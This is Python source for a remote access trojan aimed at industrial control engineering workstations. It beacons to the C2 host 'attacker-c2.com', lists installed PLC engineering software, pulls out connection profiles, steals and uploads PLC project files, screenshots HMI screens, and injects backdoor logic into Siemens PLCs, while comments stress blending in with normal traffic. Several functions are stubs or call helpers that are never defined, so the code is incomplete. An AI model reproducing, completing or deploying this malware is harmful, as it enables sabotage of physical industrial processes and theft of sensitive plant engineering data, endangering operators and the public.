# ics_rat.py - Custom RAT for OT environments
import socket
import subprocess
import os
import json
import time

class ICS_RAT:
    def __init__(self, c2_server, c2_port):
        self.c2_server = c2_server
        self.c2_port = c2_port
        self.sock = None

    def connect_to_c2(self):
        """
        Establish connection to command & control server
        Use HTTPS for stealth (blend with normal traffic)
        """
        while True:
            try:
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.connect((self.c2_server, self.c2_port))
                print("[+] Connected to C2")
                break
            except:
                time.sleep(60)  # Retry every minute

    def enumerate_ics_software(self):
        """
        Detect installed ICS engineering software
        """
        ics_software = {
            "Siemens TIA Portal": r"C:\Program Files\Siemens\Automation",
            "Rockwell RSLogix 5000": r"C:\Program Files (x86)\Rockwell Software",
            "Schneider Unity Pro": r"C:\Program Files (x86)\Schneider Electric",
            "Wonderware InTouch": r"C:\Program Files (x86)\Wonderware",
            "Ignition": r"C:\Program Files\Inductive Automation"
        }

        installed = []
        for name, path in ics_software.items():
            if os.path.exists(path):
                installed.append(name)

        return installed

    def extract_plc_connection_profiles(self):
        """
        Extract saved PLC connection configurations
        Contains IP addresses, credentials, project paths
        """
        profiles = []

        # TIA Portal connection profiles
        tia_profiles = os.path.expanduser(r"~\AppData\Roaming\Siemens\Automation\Portal")
        if os.path.exists(tia_profiles):
            # Parse XML config files
            # Extract PLC IP addresses, project names

        # RSLogix connections (in .ACD project files and registry)
        # Schneider Unity Pro connections

        return profiles

    def steal_plc_programs(self, plc_ip, plc_type):
        """
        Use legitimate engineering software to download PLC program
        Appears as normal engineering activity
        """
        if plc_type == "Siemens":
            # Use snap7 or TIA Portal Openness API
            cmd = f'powershell -c "Import-Module TIA; Get-PLCProgram -IP {plc_ip}"'
            output = subprocess.check_output(cmd, shell=True)
            return output

        elif plc_type == "Rockwell":
            # Use RSLogix SDK
            # Upload .ACD file from PLC
            pass

    def inject_malware_into_plc(self, plc_ip, malware_block):
        """
        Modify PLC program to include backdoor
        Upload using legitimate tools (trusted by network monitoring)
        """
        # Download existing program
        original_program = self.steal_plc_programs(plc_ip, "Siemens")

        # Inject malicious rung/block
        infected_program = self.inject_malicious_logic(original_program, malware_block)

        # Upload infected program
        self.upload_program(plc_ip, infected_program)

    def screenshot_engineering_screens(self):
        """
        Capture HMI/SCADA screenshots
        Reveals process architecture, tag names, setpoints
        """
        import pyautogui
        screenshot = pyautogui.screenshot()
        screenshot.save("ews_screenshot.png")
        return "ews_screenshot.png"

    def exfiltrate_project_files(self):
        """
        Steal all PLC project files from EWS
        """
        project_paths = [
            r"C:\Users\*\Documents\Siemens\*.ap17",
            r"C:\Users\*\Documents\Rockwell\*.ACD",
            r"C:\Users\*\Documents\Schneider\*.STU"
        ]

        # Zip and exfiltrate
        import zipfile
        with zipfile.ZipFile("stolen_projects.zip", 'w') as zf:
            for pattern in project_paths:
                for file in glob.glob(pattern):
                    zf.write(file)

        # Send to C2
        self.upload_file_to_c2("stolen_projects.zip")

    def command_loop(self):
        """
        Main C2 command loop
        """
        while True:
            # Receive command from C2
            cmd = self.sock.recv(4096).decode()

            if cmd == "enum_ics":
                result = self.enumerate_ics_software()
            elif cmd == "steal_projects":
                result = self.exfiltrate_project_files()
            elif cmd == "screenshot":
                result = self.screenshot_engineering_screens()
            elif cmd.startswith("inject_plc"):
                plc_ip = cmd.split()[1]
                result = self.inject_malware_into_plc(plc_ip, "backdoor.ob")

            # Send result back to C2
            self.sock.send(json.dumps(result).encode())

# RAT main execution
if __name__ == "__main__":
    rat = ICS_RAT("attacker-c2.com", 443)
    rat.connect_to_c2()
    rat.command_loop()
